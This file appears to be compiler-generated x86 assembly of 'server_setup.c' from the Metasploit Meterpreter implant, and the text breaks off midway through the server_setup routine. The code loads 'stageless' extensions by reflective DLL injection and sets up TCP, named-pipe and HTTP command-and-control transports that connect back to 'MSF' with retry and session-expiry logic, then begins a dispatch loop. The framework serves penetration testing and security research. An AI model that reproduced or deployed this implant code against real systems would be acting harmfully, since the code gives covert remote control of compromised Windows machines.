	.file	"server_setup.c"
	.text
	.def	_time;	.scl	3;	.type	32;	.endef
_time:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___time32, %eax
	call	*%eax
	leave
	ret
	.section .rdata,"dr"
LC0:
	.ascii "[%04x] \0"
LC1:
	.ascii "\15\12\0"
	.text
	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
_real_dprintf:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%esi
	pushl	%ebx
	subl	$1072, %esp
	movl	__imp__GetCurrentThreadId@0, %eax
	call	*%eax
	movl	%eax, 16(%esp)
	movl	$LC0, 12(%esp)
	movl	$1023, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___snprintf_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	call	_strlen
	movl	%eax, -12(%ebp)
	leal	12(%ebp), %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %ecx
	movl	$1021, %eax
	subl	-12(%ebp), %eax
	movl	%eax, %edx
	movl	$1024, %eax
	subl	-12(%ebp), %eax
	leal	-1040(%ebp), %esi
	movl	-12(%ebp), %ebx
	addl	%esi, %ebx
	movl	%ecx, 16(%esp)
	movl	8(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%ebx, (%esp)
	call	_vsnprintf_s
	movl	$LC1, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__strcat_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__OutputDebugStringA@4, %eax
	call	*%eax
	subl	$4, %esp
	nop
	leal	-8(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%ebp
	ret
	.globl	_exceptionfilter
	.def	_exceptionfilter;	.scl	2;	.type	32;	.endef
_exceptionfilter:
	pushl	%ebp
	movl	%esp, %ebp
	movl	$1, %eax
	popl	%ebp
	ret
	.section .rdata,"dr"
LC2:
	.ascii "kernel32.dll\0"
LC3:
	.ascii "ProcessIdToSessionId\0"
	.text
	.globl	_server_sessionid
	.def	_server_sessionid;	.scl	2;	.type	32;	.endef
_server_sessionid:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$36, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	_processIdToSessionId.83553, %eax
	testl	%eax, %eax
	jne	L7
	movl	$LC2, (%esp)
	movl	__imp__LoadLibraryA@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L7
	movl	$LC3, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	%eax, _processIdToSessionId.83553
L7:
	movl	_processIdToSessionId.83553, %eax
	testl	%eax, %eax
	je	L12
	movl	_processIdToSessionId.83553, %ebx
	movl	__imp__GetCurrentProcessId@0, %eax
	call	*%eax
	leal	-16(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	*%ebx
	subl	$8, %esp
	testl	%eax, %eax
	jne	L9
	movl	$-1, -16(%ebp)
	jmp	L9
L12:
	nop
L9:
	cmpl	$0, -12(%ebp)
	je	L10
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__FreeLibrary@4, %eax
	call	*%eax
	subl	$4, %esp
L10:
	movl	-16(%ebp), %eax
	movl	-4(%ebp), %ebx
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC4:
	.ascii "[SERVER] Extension located at 0x%p: %u bytes\0"
	.align 4
LC5:
	.ascii "[SERVER] All stageless extensions loaded\0"
	.align 4
LC6:
	.ascii "[STAGELESS] init data at %p, ID %u, size is %d\0"
	.align 4
LC7:
	.ascii "[STAGELESS] init done, now pointing to %p\0"
LC8:
	.ascii "[STAGELESS] %p contains %x\0"
	.align 4
LC9:
	.ascii "[SERVER] All stageless extensions initialised\0"
	.text
	.globl	_load_stageless_extensions
	.def	_load_stageless_extensions;	.scl	2;	.type	32;	.endef
_load_stageless_extensions:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	jmp	L14
L15:
	movl	12(%ebp), %eax
	movl	(%eax), %eax
	movl	12(%ebp), %edx
	addl	$4, %edx
	movl	%eax, 8(%esp)
	movl	%edx, 4(%esp)
	movl	$LC4, (%esp)
	call	_real_dprintf
	movl	12(%ebp), %eax
	movl	(%eax), %eax
	movl	12(%ebp), %edx
	addl	$4, %edx
	movl	$1, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_LoadLibraryR@12
	subl	$12, %esp
	movl	%eax, -32(%ebp)
	movl	_extensionCommands, %eax
	movl	%eax, 16(%esp)
	movl	$0, 12(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$1, 4(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_load_extension
	movl	12(%ebp), %eax
	leal	4(%eax), %edx
	movl	12(%ebp), %eax
	movl	(%eax), %eax
	addl	%edx, %eax
	movl	%eax, 12(%ebp)
L14:
	movl	12(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L15
	movl	$LC5, (%esp)
	call	_real_dprintf
	movl	12(%ebp), %eax
	addl	$4, %eax
	movl	%eax, -12(%ebp)
	jmp	L16
L17:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	-12(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -20(%ebp)
	movl	$8, -24(%ebp)
	movl	-12(%ebp), %edx
	movl	-24(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -28(%ebp)
	movl	-20(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC6, (%esp)
	call	_real_dprintf
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_stagelessinit_extension
	movl	-28(%ebp), %edx
	movl	-20(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC7, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC8, (%esp)
	call	_real_dprintf
L16:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$-1, %eax
	jne	L17
	movl	$LC9, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	addl	$4, %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC10:
	.ascii "[TRNS] Transport claims to have URL: %S\0"
	.align 4
LC11:
	.ascii "[TRNS] Transport claims to have comms: %d\0"
	.align 4
LC12:
	.ascii "[TRNS] Transport claims to have retry total: %d\0"
	.align 4
LC13:
	.ascii "[TRNS] Transport claims to have retry wait: %d\0"
	.align 2
LC14:
	.ascii "t\0c\0p\0\0\0"
	.align 2
LC15:
	.ascii "p\0i\0p\0e\0\0\0"
	.text
	.def	_create_transport;	.scl	3;	.type	32;	.endef
_create_transport:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC10, (%esp)
	call	_real_dprintf
	movl	12(%ebp), %eax
	movl	1024(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC11, (%esp)
	call	_real_dprintf
	movl	12(%ebp), %eax
	movl	1028(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC12, (%esp)
	call	_real_dprintf
	movl	12(%ebp), %eax
	movl	1032(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC13, (%esp)
	call	_real_dprintf
	movl	12(%ebp), %eax
	movl	$3, 8(%esp)
	movl	$LC14, 4(%esp)
	movl	%eax, (%esp)
	call	_wcsncmp
	testl	%eax, %eax
	jne	L20
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_create_tcp
	movl	%eax, -12(%ebp)
	jmp	L21
L20:
	movl	12(%ebp), %eax
	movl	$4, 8(%esp)
	movl	$LC15, 4(%esp)
	movl	%eax, (%esp)
	call	_wcsncmp
	testl	%eax, %eax
	jne	L22
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_create_named_pipe
	movl	%eax, -12(%ebp)
	jmp	L21
L22:
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_create_http
	movl	%eax, -12(%ebp)
L21:
	cmpl	$0, -12(%ebp)
	jne	L23
	movl	$0, %eax
	jmp	L24
L23:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	jne	L25
	movl	-12(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 72(%eax)
	movl	-12(%ebp), %eax
	movl	72(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 4(%eax)
	jmp	L26
L25:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	72(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, 72(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	72(%eax), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 72(%eax)
L26:
	movl	-12(%ebp), %eax
L24:
	leave
	ret
	.def	_append_transport;	.scl	3;	.type	32;	.endef
_append_transport:
	pushl	%ebp
	movl	%esp, %ebp
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L28
	movl	12(%ebp), %eax
	movl	12(%ebp), %edx
	movl	%edx, 72(%eax)
	movl	12(%ebp), %eax
	movl	72(%eax), %edx
	movl	12(%ebp), %eax
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%eax)
	jmp	L30
L28:
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	movl	72(%eax), %edx
	movl	12(%ebp), %eax
	movl	%edx, 72(%eax)
	movl	8(%ebp), %eax
	movl	(%eax), %edx
	movl	12(%ebp), %eax
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	movl	72(%eax), %eax
	movl	12(%ebp), %edx
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	movl	12(%ebp), %edx
	movl	%edx, 72(%eax)
L30:
	nop
	popl	%ebp
	ret
	.def	_remove_transport;	.scl	3;	.type	32;	.endef
_remove_transport:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	cmpl	%eax, %edx
	jne	L32
	movl	8(%ebp), %eax
	movl	$0, 4(%eax)
	jmp	L33
L32:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	cmpl	%eax, 12(%ebp)
	jne	L34
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	8(%ebp), %eax
	movl	%edx, 4(%eax)
L34:
	movl	12(%ebp), %eax
	movl	72(%eax), %eax
	movl	12(%ebp), %edx
	movl	68(%edx), %edx
	movl	%edx, 68(%eax)
	movl	12(%ebp), %eax
	movl	68(%eax), %eax
	movl	12(%ebp), %edx
	movl	72(%edx), %edx
	movl	%edx, 72(%eax)
L33:
	movl	12(%ebp), %eax
	movl	28(%eax), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	nop
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC16:
	.ascii "[TRANS] transport created of size %u\0"
	.text
	.def	_create_transports;	.scl	3;	.type	32;	.endef
_create_transports:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, -16(%ebp)
	jmp	L36
L39:
	leal	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_transport
	testl	%eax, %eax
	je	L37
	movl	-20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC16, (%esp)
	call	_real_dprintf
	movl	-20(%ebp), %eax
	addl	%eax, -12(%ebp)
	movl	-20(%ebp), %eax
	addl	%eax, -16(%ebp)
	jmp	L36
L37:
	movl	$0, %eax
	jmp	L38
L36:
	movl	-16(%ebp), %eax
	movzwl	(%eax), %eax
	testw	%ax, %ax
	jne	L39
	movl	-12(%ebp), %eax
	leal	2(%eax), %edx
	movl	16(%ebp), %eax
	movl	%edx, (%eax)
	movl	$1, %eax
L38:
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC17:
	.ascii "[CONFIG] preparing the configuration\0"
	.align 4
LC18:
	.ascii "[CONFIG] Allocating %u bytes for transport, total of %u bytes\0"
	.align 4
LC19:
	.ascii "[CONFIG] Comms handle set to %p\0"
	.align 4
LC20:
	.ascii "[CONFIG] Total of %u bytes located at 0x%p\0"
	.text
	.def	_config_create;	.scl	3;	.type	32;	.endef
_config_create:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$52, %esp
	movl	$48, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, -16(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	$LC17, (%esp)
	call	_real_dprintf
	cmpl	$0, 12(%ebp)
	jne	L41
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	addl	$16, %eax
	jmp	L42
L41:
	movl	12(%ebp), %eax
L42:
	movl	-16(%ebp), %edx
	addl	$16, %edx
	movl	$16, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	leal	32(%eax), %edx
	movl	-16(%ebp), %eax
	addl	$32, %eax
	movl	$16, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_memcpy
	movl	8(%ebp), %eax
	movl	72(%eax), %ebx
	call	_current_unix_timestamp
	subl	%eax, %ebx
	movl	%ebx, %edx
	movl	-16(%ebp), %eax
	movl	%edx, 12(%eax)
	movl	-16(%ebp), %eax
	movl	$170532320, 8(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -24(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -20(%ebp)
L48:
	movl	-20(%ebp), %eax
	movl	12(%eax), %eax
	movl	-20(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -28(%ebp)
	movl	-12(%ebp), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, 8(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC18, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_realloc
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %edx
	movl	-12(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
	movl	-28(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	-28(%ebp), %eax
	addl	%eax, -12(%ebp)
	movl	-20(%ebp), %eax
	cmpl	-24(%ebp), %eax
	jne	L43
	movl	-20(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	je	L43
	movl	-20(%ebp), %eax
	movl	4(%eax), %eax
	movl	-20(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	-16(%ebp), %edx
	movl	%eax, (%edx)
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC19, (%esp)
	call	_real_dprintf
L43:
	movl	-20(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$8, %eax
	je	L44
	cmpl	$8, %eax
	ja	L45
	cmpl	$6, %eax
	je	L46
	cmpl	$6, %eax
	ja	L45
	cmpl	$1, %eax
	je	L47
	cmpl	$2, %eax
	je	L46
	jmp	L45
L47:
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_write_tcp_config
	jmp	L45
L44:
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_write_named_pipe_config
	jmp	L45
L46:
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_write_http_config
	nop
L45:
	movl	-20(%ebp), %eax
	movl	68(%eax), %eax
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	cmpl	-24(%ebp), %eax
	jne	L48
	movl	$10, -36(%ebp)
	movl	-12(%ebp), %edx
	movl	-36(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_realloc
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %edx
	movl	-12(%ebp), %eax
	addl	%eax, %edx
	movl	-36(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$255, 4(%esp)
	movl	%edx, (%esp)
	call	_memset
	movl	-36(%ebp), %eax
	leal	-4(%eax), %edx
	movl	-16(%ebp), %ecx
	movl	-12(%ebp), %eax
	addl	%ecx, %eax
	movl	%edx, 8(%esp)
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	call	_memset
	movl	-36(%ebp), %eax
	addl	%eax, -12(%ebp)
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC20, (%esp)
	call	_real_dprintf
	movl	20(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, (%eax)
	movl	16(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, (%eax)
	nop
	addl	$52, %esp
	popl	%ebx
	popl	%ebp
	ret
	.section .rdata,"dr"
	.align 4
LC21:
	.ascii "[SERVER] Initializing from configuration: 0x%p\0"
LC22:
	.ascii "[SESSION] Comms handle: %u\0"
LC23:
	.ascii "[SESSION] Expiry: %u\0"
	.align 4
LC24:
	.ascii "[SERVER] UUID: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\0"
	.align 4
LC25:
	.ascii "[SERVER] Session GUID: %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X\0"
	.align 4
LC26:
	.ascii "[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X\0"
	.align 4
LC27:
	.ascii "[DISPATCH] Session going for %u seconds from %u to %u\0"
	.align 4
LC28:
	.ascii "[DISPATCH] Transport handle is %p\0"
	.align 4
LC29:
	.ascii "[SERVER] Registering dispatch routines...\0"
	.align 4
LC30:
	.ascii "[SERVER] Copying configuration ..\0"
LC31:
	.ascii "[SERVER] Config copied..\0"
	.align 4
LC32:
	.ascii "[SERVER] Time to kick off connectivity to MSF ...\0"
	.align 4
LC33:
	.ascii "[SERVER] attempting to initialise transport 0x%p\0"
	.align 4
LC34:
	.ascii "[SERVER] transport initialisation failed, moving to the next transport\0"
	.align 4
LC35:
	.ascii "[SERVER] Entering the main server dispatch loop for transport %x, context %x\0"
	.align 4
LC36:
	.ascii "[DISPATCH] dispatch exited with result: %u\0"
	.align 4
LC37:
	.ascii "[DISPATCH] deinitialising transport\0"
LC38:
	.ascii "[TRANS] resetting transport\0"
	.align 4
LC39:
	.ascii "[DISPATCH] Server requested shutdown of dispatch\0"
	.align 4
LC40:
	.ascii "[DISPATCH] No next transport specified, leaving\0"
	.align 4
LC41:
	.ascii "[TRANS] Moving transport from 0x%p to 0x%p\0"
	.align 4
LC42:
	.ascii "[TRANS] Sleeping for %u seconds ...\0"
	.align 4
LC43:
	.ascii "[SERVER] Deregistering dispatch routines...\0"
	.align 4
LC44:
	.ascii "[DISPATCH] calling scheduler_destroy...\0"
	.align 4
LC45:
	.ascii "[DISPATCH] calling command_join_threads...\0"
LC46:
	.ascii "[SERVER] Finished.\0"
	.text
	.globl	_server_setup
	.def	_server_setup;	.scl	2;	.type	32;	.endef
_server_setup:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$684, %esp
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -304(%ebp)
	leal	-300(%ebp), %edx
	movl	$0, %eax
	movl	$63, %ecx
	movl	%edx, %edi
	rep stosl
	movl	$0, -560(%ebp)
	leal	-556(%ebp), %edx
	movl	$0, %eax
	movl	$63, %ecx
	movl	%edx, %edi
	rep stosl
	movl	$0, -36(%ebp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC21, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	4(%eax), %edx
	movl	(%eax), %eax
	movl	%eax, 4(%esp)
	movl	%edx, 8(%esp)
	movl	$LC22, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC23, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movzbl	31(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	movzbl	30(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -572(%ebp)
	movl	8(%ebp), %eax
	movzbl	29(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -576(%ebp)
	movl	8(%ebp), %eax
	movzbl	28(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -580(%ebp)
	movl	8(%ebp), %eax
	movzbl	27(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -584(%ebp)
	movl	8(%ebp), %eax
	movzbl	26(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -588(%ebp)
	movl	8(%ebp), %eax
	movzbl	25(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -592(%ebp)
	movl	8(%ebp), %eax
	movzbl	24(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -596(%ebp)
	movl	8(%ebp), %eax
	movzbl	23(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -600(%ebp)
	movl	8(%ebp), %eax
	movzbl	22(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -604(%ebp)
	movl	8(%ebp), %eax
	movzbl	21(%eax), %eax
	movzbl	%al, %edi
	movl	8(%ebp), %eax
	movzbl	20(%eax), %eax
	movzbl	%al, %esi
	movl	8(%ebp), %eax
	movzbl	19(%eax), %eax
	movzbl	%al, %ebx
	movl	8(%ebp), %eax
	movzbl	18(%eax), %eax
	movzbl	%al, %ecx
	movl	8(%ebp), %eax
	movzbl	17(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -608(%ebp)
	movl	8(%ebp), %eax
	movzbl	16(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 64(%esp)
	movl	-572(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-576(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-580(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-584(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-588(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-592(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-596(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-600(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-604(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-608(%ebp), %ebx
	movl	%ebx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC24, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movzbl	47(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	movzbl	46(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -572(%ebp)
	movl	8(%ebp), %eax
	movzbl	45(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -576(%ebp)
	movl	8(%ebp), %eax
	movzbl	44(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -580(%ebp)
	movl	8(%ebp), %eax
	movzbl	43(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -584(%ebp)
	movl	8(%ebp), %eax
	movzbl	42(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -588(%ebp)
	movl	8(%ebp), %eax
	movzbl	41(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -592(%ebp)
	movl	8(%ebp), %eax
	movzbl	40(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -596(%ebp)
	movl	8(%ebp), %eax
	movzbl	39(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -600(%ebp)
	movl	8(%ebp), %eax
	movzbl	38(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -604(%ebp)
	movl	8(%ebp), %eax
	movzbl	37(%eax), %eax
	movzbl	%al, %edi
	movl	8(%ebp), %eax
	movzbl	36(%eax), %eax
	movzbl	%al, %esi
	movl	8(%ebp), %eax
	movzbl	35(%eax), %eax
	movzbl	%al, %ebx
	movl	8(%ebp), %eax
	movzbl	34(%eax), %eax
	movzbl	%al, %ecx
	movl	8(%ebp), %eax
	movzbl	33(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -608(%ebp)
	movl	8(%ebp), %eax
	movzbl	32(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 64(%esp)
	movl	-572(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-576(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-580(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-584(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-588(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-592(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-596(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-600(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-604(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-608(%ebp), %esi
	movl	%esi, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC25, (%esp)
	call	_real_dprintf
	call	_disable_thread_error_reporting
	movl	$0, (%esp)
	call	_time
	movl	%eax, (%esp)
	call	_srand
	call	_thread_open
	movl	%eax, -28(%ebp)
	movl	-28(%ebp), %eax
	movl	8(%eax), %ecx
	movl	-28(%ebp), %eax
	movl	(%eax), %edx
	movl	-28(%ebp), %eax
	movl	4(%eax), %eax
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC26, (%esp)
	call	_real_dprintf
	call	_remote_allocate
	movl	%eax, -32(%ebp)
	cmpl	$0, -32(%ebp)
	jne	L50
	movl	$8, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L70
L50:
	movl	8(%ebp), %eax
	movl	12(%eax), %edx
	movl	-32(%ebp), %eax
	movl	%edx, 68(%eax)
	call	_current_unix_timestamp
	movl	-32(%ebp), %edx
	movl	%eax, 76(%edx)
	movl	-32(%ebp), %eax
	movl	76(%eax), %edx
	movl	8(%ebp), %eax
	movl	12(%eax), %eax
	addl	%eax, %edx
	movl	-32(%ebp), %eax
	movl	%edx, 72(%eax)
	movl	-32(%ebp), %eax
	movl	72(%eax), %ecx
	movl	-32(%ebp), %eax
	movl	76(%eax), %edx
	movl	-32(%ebp), %eax
	movl	68(%eax), %eax
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC27, (%esp)
	call	_real_dprintf
	movl	$0, -564(%ebp)
	movl	8(%ebp), %eax
	leal	48(%eax), %edx
	leal	-564(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	%edx, 4(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_transports
	testl	%eax, %eax
	jne	L52
	movl	$160, (%esp)
